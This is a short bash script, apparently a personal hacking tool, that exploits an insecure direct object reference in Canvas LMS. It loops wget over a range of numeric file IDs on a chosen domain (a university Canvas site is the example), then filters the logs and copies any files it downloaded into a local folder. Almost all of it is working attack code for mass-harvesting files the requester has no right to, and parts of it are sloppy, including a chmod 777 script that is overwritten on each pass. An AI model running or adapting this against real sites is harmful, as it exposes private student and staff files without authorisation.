#!/bin/bash 
#A quick little bashscript by n3on @n3onhacks

#Menu
echo "CIDOR - Canvas IDOR checker v.2.0.1"
echo "Usage: checks domain/[num]/files to check for accessible files via Canvas IDOR (CIDOR) issue"
echo "...cleaning previous results..."

#Target Selection, Options
echo "SELECT your TARGET (ex: canvas.uchicago.edu):"
read DOMAIN
echo "What number would you like to START FUZZING at? (ex: 300):"
read FIRST
echo "What number would you like to STOP FUZZING at? (ex: 10000):"
read NUMBER
echo "..::Starting Canvas IDOR::.."

#URL Layout Options
a="https://"
b=$DOMAIN
c="/files/"
d=1
e="/download/"
f="cidor_results.txt"
g=$NUMBER
h=$FIRST
target=${a}${b}${c}${d}${e}


cd temp

#Loop for IDOR by numbers 
for ((d=${h}; d<=${g}; d++))
do
	wget --append-output=${f} ${a}${b}${c}${d}${e}
	echo ${a}${b}${c}${d}${e}
	done

#Pre-results
echo "Completed. Querying through logs....."
cat /opt/cidor/temp/cidor_results.txt | grep -B 22 "50K .........." > /opt/cidor/temp/cleaner1.txt 
cat /opt/cidor/temp/cleaner1.txt | grep "Saving to" | cut -d " " -f 3 | tr -d ":" > /opt/cidor/temp/cleaner2.txt
cat /opt/cidor/temp/cleaner2.txt | awk '{print substr($0,2,length($0)-2)}' > /opt/cidor/temp/clean.txt

#Final Horrahc
File="/opt/cidor/temp/clean.txt"
echo "#!/bin/bash" > /opt/cidor/temp/final_results.sh
Lines=$(cat $File)
for Line in $Lines
do
echo "cp /opt/cidor/temp/'$Line' /opt/cidor/downloads" > /opt/cidor/temp/updated_results.txt
cat /opt/cidor/temp/updated_results.txt > /opt/cidor/temp/final_results.sh
chmod 777 /opt/cidor/temp/final_results.sh
./final_results.sh

cat /opt/cidor/temp/cleaner1.txt
echo "Application/Pdf Files Revieved:"
ls -l /opt/cidor/downloads/


done
